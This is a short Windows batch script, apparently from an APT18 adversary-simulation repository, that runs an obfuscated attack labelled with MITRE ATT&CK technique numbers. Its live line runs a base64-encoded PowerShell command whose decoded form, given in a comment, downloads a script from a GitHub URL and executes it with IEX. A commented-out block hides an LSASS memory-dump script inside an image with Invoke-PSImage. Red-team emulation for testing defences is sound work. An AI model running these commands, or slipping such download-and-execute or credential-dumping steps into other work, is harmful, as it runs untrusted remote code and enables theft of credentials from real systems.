@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Obfuscated Files or Information	(T1028) - System Information Discovery (T1082)
ECHO.
ECHO [+] T1027	-	Obfuscated Files or Information
ECHO [+] T1082	-	System Information Discovery
ECHO -------------------------------------------------------------------
powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AZwByAGUAeQBjAGUAbAAvAEEAUABUAC0AUwBpAG0AdQBsAGEAdABpAG8AbgAvAG0AYQBzAHQAZQByAC8AQQBQAFQAMQA4AC8AVAAxADAAMgA3AC0AVAAxADAAOAAyAC8ATwBiAGYAdQBzAGMAYQB0AGUAZABfAFMAeQBzAGkAbgBmAG8ALgB0AHgAdAAiACkA
ECHO -------------------------------------------------------------------
::Decoded-Payload: 
::'IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/greycel/APT-Simulation/master/APT18/T1027-T1082/Obfuscated_Sysinfo.txt")'
ECHO.



::ECHO [+] Using Powershell (Embed a powershell script within the pixels of an image)
::ECHO -------------------------------------------------------------------
::powershell import-module %PAYLOAD%\T1027\Invoke-PSImage.ps1;Invoke-PSImage -script %PAYLOAD%\T1003\LSASS_Memory_Dump.ps1 -out %Utilities%\evil.png -image %Utilities%\joker.jpg
::ECHO.

